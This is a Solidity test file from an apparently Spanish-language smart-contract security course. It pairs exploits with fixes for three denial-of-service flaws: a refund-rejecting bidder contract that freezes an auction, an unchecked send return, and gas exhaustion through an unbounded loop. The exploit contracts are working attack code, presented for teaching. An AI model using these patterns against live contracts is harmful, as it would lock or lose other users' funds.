// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {BaseChallenge} from "./base/BaseChallenge.t.sol";
import {SubastaVulnerable, RecompensasVulnerable, RepartoVulnerable} from "../src/C3-llamadas-dos/Vulnerable.sol";
import {SubastaFixed, RecompensasFixed, RepartoFixed} from "../src/C3-llamadas-dos/Fixed.sol";

interface ISubasta {
    function pujar() external payable;
}

/// @notice Postor malicioso: puja y rechaza cualquier reembolso, congelando la subasta.
contract PostorMalicioso {
    ISubasta public subasta;

    constructor(address _subasta) {
        subasta = ISubasta(_subasta);
    }

    function pujar() external payable {
        subasta.pujar{value: msg.value}();
    }

    receive() external payable {
        revert("no acepto reembolsos");
    }
}

/// @notice Contrato sin receive(): no puede recibir Ether, provoca el fallo silencioso.
contract SinReceive {
    RecompensasVulnerable public rec;

    constructor(address _rec) {
        rec = RecompensasVulnerable(_rec);
    }

    function reclamar() external {
        rec.reclamar();
    }
}

contract C3_LlamadasDoS is BaseChallenge {
    // Variante A: DoS por revert en el reembolso push (reto principal)

    function test_Exploit_Vulnerable() public {
        vm.prank(deployer);
        SubastaVulnerable subasta = new SubastaVulnerable();

        // Puja honesta inicial.
        vm.prank(user1);
        subasta.pujar{value: 1 ether}();

        // El atacante puja desde un contrato que rechaza reembolsos.
        vm.prank(attacker);
        PostorMalicioso postor = new PostorMalicioso(address(subasta));
        vm.prank(attacker);
        postor.pujar{value: 2 ether}();
        assertEq(subasta.mejorPostor(), address(postor), "el atacante es el mejor postor");

        // Nadie puede desbancarlo: el reembolso al atacante revierte, la subasta
        // queda congelada.
        vm.prank(user2);
        vm.expectRevert(bytes("no acepto reembolsos"));
        subasta.pujar{value: 3 ether}();

        assertEq(subasta.mejorPostor(), address(postor), "la subasta sigue congelada");
    }

    function test_Fixed_Resiste() public {
        vm.prank(deployer);
        SubastaFixed subasta = new SubastaFixed();

        vm.prank(user1);
        subasta.pujar{value: 1 ether}();

        PostorMalicioso postor = new PostorMalicioso(address(subasta));
        vm.deal(address(postor), 2 ether);
        postor.pujar{value: 2 ether}();

        // Con patrón pull, una puja honesta superior SÍ desbanca al atacante:
        // su reembolso solo se apunta, no se empuja.
        vm.prank(user2);
        subasta.pujar{value: 3 ether}();

        assertEq(subasta.mejorPostor(), user2, "el postor honesto desbanca al atacante");
        assertEq(subasta.reembolsos(address(postor)), 2 ether, "el reembolso queda apuntado");
    }

    // Variante B: valor de retorno ignorado (SC06)

    function test_Exploit_UncheckedReturn_Vulnerable() public {
        vm.prank(deployer);
        RecompensasVulnerable rec = new RecompensasVulnerable();

        SinReceive victima = new SinReceive(address(rec));
        rec.asignar{value: 1 ether}(address(victima));

        // reclamar() no revierte aunque el envío falle: el estado se pone a 0
        // y el Ether se queda en el contrato. Pérdida silenciosa.
        victima.reclamar();

        assertEq(rec.pendiente(address(victima)), 0, "la deuda se marco como pagada");
        assertEq(address(victima).balance, 0, "pero el contrato no recibio nada");
        assertEq(address(rec).balance, 1 ether, "el Ether sigue atrapado en Recompensas");
    }

    function test_Fixed_UncheckedReturn_Resiste() public {
        vm.prank(deployer);
        RecompensasFixed rec = new RecompensasFixed();

        SinReceiveFixed victima = new SinReceiveFixed(address(rec));
        rec.asignar{value: 1 ether}(address(victima));

        // Ahora el envío fallido revierte, así que la deuda NO se pierde.
        vm.expectRevert(bytes("transferencia fallida"));
        victima.reclamar();

        assertEq(rec.pendiente(address(victima)), 1 ether, "la deuda se conserva");
    }
    // Variante C: bucle no acotado

    // Gas máximo de referencia para una transacción (límite de bloque). Se usa el
    // valor histórico de 30 millones; el argumento no depende de la cifra, porque
    // el coste de repartir() crece sin cota con el número de participantes.
    uint256 constant LIMITE_BLOQUE = 30_000_000;
    uint256 constant N_REGISTROS = 1000;

    function _registrarMuchos(address reparto) internal {
        // Cualquier cuenta puede alargar la lista: el atacante registra N
        // direcciones propias, cada una en una transacción barata.
        vm.startPrank(attacker);
        for (uint160 i = 1; i <= N_REGISTROS; i++) {
            RepartoVulnerable(reparto).registrar(address(uint160(0x10000) + i));
        }
        vm.stopPrank();
    }

    function test_Exploit_BucleNoAcotado_Vulnerable() public {
        vm.prank(deployer);
        RepartoVulnerable reparto = new RepartoVulnerable{value: 10 ether}();
        vm.prank(user1);
        reparto.registrar(user1);
        _registrarMuchos(address(reparto));

        // Medición en una instantánea que luego se descarta: sin límite de gas,
        // repartir() funciona, pero consume más que un bloque entero.
        uint256 snap = vm.snapshotState();
        vm.prank(deployer);
        uint256 gasAntes = gasleft();
        reparto.repartir();
        uint256 gasNecesario = gasAntes - gasleft();
        emit log_named_uint("Gas necesario para repartir()", gasNecesario);
        assertGt(gasNecesario, LIMITE_BLOQUE, "el reparto necesita mas gas que un bloque");
        vm.revertToState(snap);

        // El organizador intenta repartir con el gas máximo de un bloque: no basta.
        vm.prank(deployer);
        (bool ok, ) = address(reparto).call{gas: LIMITE_BLOQUE}(
            abi.encodeCall(RepartoVulnerable.repartir, ())
        );

        assertFalse(ok, "repartir() supera el gas de un bloque");
        assertFalse(reparto.repartido(), "el reparto no se completa");
        assertEq(address(reparto).balance, 10 ether, "el bote queda bloqueado");
        assertEq(user1.balance, 10 ether, "el participante honesto no cobra");
    }

    function test_Fixed_BucleNoAcotado_Resiste() public {
        vm.prank(deployer);
        RepartoFixed reparto = new RepartoFixed{value: 10 ether}();
        vm.prank(user1);
        reparto.registrar(user1);
        vm.startPrank(attacker);
        for (uint160 i = 1; i <= N_REGISTROS; i++) {
            reparto.registrar(address(uint160(0x10000) + i));
        }
        vm.stopPrank();

        // repartir() tiene coste constante: cabe de sobra en un bloque.
        vm.prank(deployer);
        uint256 gasAntes = gasleft();
        reparto.repartir();
        uint256 gasUsado = gasAntes - gasleft();
        emit log_named_uint("Gas de repartir() corregido", gasUsado);
        assertLt(gasUsado, 100_000, "repartir() no depende del numero de participantes");

        // El participante honesto retira su cuota sin depender del resto.
        uint256 cuota = 10 ether / (N_REGISTROS + 1);
        vm.prank(user1);
        reparto.reclamar();
        assertEq(user1.balance, 10 ether + cuota, "el participante honesto cobra su cuota");
    }
}

/// @notice Igual que SinReceive pero apuntando a la versión corregida.
contract SinReceiveFixed {
    RecompensasFixed public rec;

    constructor(address _rec) {
        rec = RecompensasFixed(_rec);
    }

    function reclamar() external {
        rec.reclamar();
    }
}
